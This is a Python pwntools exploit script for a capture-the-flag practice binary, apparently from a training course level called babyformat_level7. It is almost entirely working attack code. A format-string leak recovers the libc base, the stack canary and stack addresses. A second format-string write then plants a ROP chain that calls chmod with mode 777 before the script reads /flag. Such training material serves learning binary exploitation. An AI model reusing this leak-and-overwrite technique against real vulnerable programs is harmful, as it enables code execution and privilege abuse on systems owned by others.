#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template babyformat_level7
from pwn import *
from os import system

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babyformat_level7')
context.arch = 'amd64'
context.terminal = ["tmux", "splitw", "-h"]
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

# exploit = f'%p'+' %p'*159
exploit = f'%p'+' %p'*159
print("payload 1 start")
payload = exploit.encode()  
io.recvuntil(b'read your input again.')
io.sendline(payload)
print("payload 1 send")
io.recvuntil(b"Your input is:")
io.recvline()
print("received bytes after payload 1 sent")
leak_bytes = io.recvline(keepends=False)
leak = leak_bytes.decode().split(' ')

leaked_libc_func_int = int(leak[0], 16)
libc_base = leaked_libc_func_int - 0x1ed723
print(f"libc_base : 0x{libc_base:x}")

leaked_rbp = leak[156]
print(f"leaked rbp : {leaked_rbp}")
rbp_main = int(leaked_rbp, 16)  
rbp_func = rbp_main - 344 
print(f"leaked rbp func : {hex(rbp_func)}")
leaked_ret = rbp_func + 8
rip_func_addr = leaked_ret
print(f"leaked rip func : {hex(leaked_ret)}")

rsp_func=rbp_func-1184 
print(f"leaked rsp_func : 0x{rsp_func:x}")

leaked_current_instruction = int(leak[154], 16) - 382
print(f"leaked_current_instruction : 0x{leaked_current_instruction:x}")
print(f"rip and rsp diff func in block : {(rip_func_addr - rsp_func)/8}")
print(f"canary in block : {(rbp_func - rsp_func - 8)/8}")

leaked_canary = int(leak[150], 16)  
print(f"leaked_canary : 0x{leaked_canary:x}")
# leaked_func_rbp = int(leak[151], 16)  
# print(f"leaked_func_rbp : {leaked_func_rbp:x}")
# leaked_func_rip = int(leak[152], 16)  
# print(f"leaked_func_rip : {leaked_func_rip:x}")

base = libc_base
rip_func =  rip_func_addr
pop_rdi = base+0x23b6a 
pop_rsi = base+0x2601f 
pop_rdx = base+0x142c92 
pop_rax = base+0x36174  
syscall = base+0x2284d  
# offset position of canary is 151
print("2nd payload start")
# exit_loc : p64(base + 0x578c8).ljust(8, b"\x00"),

# p2 = b"A"*3 + fmtstr_payload(30, {
#     rip_func : p64(pop_rdi).ljust(8, b"\x00"),
#     rip_func + 8 : p64(base + 0x1eb1f3).ljust(8, b"\x00"),
#     rip_func + 16 : p64(pop_rsi).ljust(8, b"\x00"),
#     rip_func + 24 : p64(0o777),
#     rip_func + 32 : p64(pop_rdx).ljust(8, b"\x00"),
#     rip_func + 40 : p64(0),
#     rip_func + 48 : p64(pop_rax).ljust(8, b"\x00"),
#     rip_func + 56 : p64(0x5a),
#     rip_func + 64 : p64(syscall).ljust(8, b"\x00")
#     }, numbwritten=64,  write_size='short', strategy='fast')

position=48
# position=30
# position = 31+8-1
# p2 = b"A"*3 + b"%c"*(position-1)+b"%n" +p64(rip_func)+p64(pop_rdi)+p64(rip_func+8)+p64(base+0x1eb1f3)+p64(rip_func+16)+p64(pop_rsi)+p64(rip_func+24)+p64(0o777)+p64(rip_func+32)+p64(pop_rdx)+p64(rip_func+40)+p64(0)+p64(rip_func+48)+p64(pop_rax)+p64(rip_func+56)+p64(0x5a)+p64(rip_func+64)+p64(syscall)

p2 = b"A"*3 + b"%c"*(position-1)+b"%n"
p2 += p64(rip_func)
p2 += p64(pop_rdi).ljust(8, b"\x00")
p2 += p64(rip_func+8)
p2 += p64(base+0x1eb1f3).ljust(8, b"\x00")
p2 += p64(rip_func+16)
p2 += p64(pop_rsi).ljust(8, b"\x00")
p2 += p64(rip_func+24)
p2 += p64(0o777)
p2 += p64(rip_func+32)
p2 += p64(pop_rdx).ljust(8, b"\x00")
p2 += p64(rip_func+40)
p2 += p64(0)
p2 += p64(rip_func+48)
p2 += p64(pop_rax).ljust(8, b"\x00")
p2 += p64(rip_func+56)
p2 += p64(0x5a)
p2 += p64(rip_func+64)
p2 += p64(syscall).ljust(8, b"\x00")

print("payload p2 is ")
print(p2)
print(io.recvline())
print(io.recvline())
print(io.recvline())
io.sendline(p2)
# try:
#     io.sendline(p2)
# except:
#     print("An exception occured at ")  
print("2nd payload end")
print(system("cat /flag"))
# system("cat /flag")
system("cat /flag")
io.interactive()

